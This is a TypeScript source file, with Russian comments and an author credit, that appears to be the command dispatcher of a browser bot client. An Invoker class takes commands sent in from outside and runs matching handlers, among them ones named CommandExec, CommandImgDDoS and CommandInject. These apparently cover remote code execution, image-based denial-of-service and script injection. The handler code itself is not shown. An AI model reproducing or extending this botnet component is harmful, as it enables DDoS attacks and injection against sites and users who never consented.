/*
    Follow me:
    @vk: vk.com/bytecode
*/

import {Command} from "./Command";
import { Process } from "../Process";

/*
    Импорт всех команд
*/
import {CommandExec} from "./commands/CommandExec";
import {CommandUrl} from "./commands/CommandUrl";
import {CommandImgDDoS} from "./commands/CommandImgDDoS";
import {CommandInject} from "./commands/CommandInject";
import {CommandPushDom} from "./commands/CommandPushDom";
import {CommandAlert} from "./commands/CommandAlert";

export interface RecivedCommand {
    command: string,
    args: string
};


export class Invoker{ 

    private commands : Array<Command> = [];
    private process : Process = null;

    constructor(process: Process){
        this.process = process;

        /*
            Регистрация классов доступных команд <extends Command>
        */
        this.commands.push(new CommandExec());
        this.commands.push(new CommandUrl());
        this.commands.push(new CommandImgDDoS());
        this.commands.push(new CommandInject());
        this.commands.push(new CommandPushDom());
        this.commands.push(new CommandAlert());
    }

    /*
        Выполнение команд, функция принимает на вход массив команд вида [{command: ..., args: ...}]
    */
    public invoke(cmds: Array<RecivedCommand>){
        for(let i = 0; i < cmds.length; i++){
            let cmd = cmds[i];
            this.callCommand(cmd.command, cmd.args);
        }
    }

    /*
        Функция ищет команду в массиве доступных команд и вызывает ее
    */
    private callCommand(cmd: string, args: string){
        for(let i = 0; i < this.commands.length; i++){
            let command = this.commands[i];
            if(command.getCommand().toLocaleLowerCase() === cmd.toLocaleLowerCase()){
                command.invoker = this;
                command.process = this.process;
                command.exec(args);
            }
        }
    }
    

}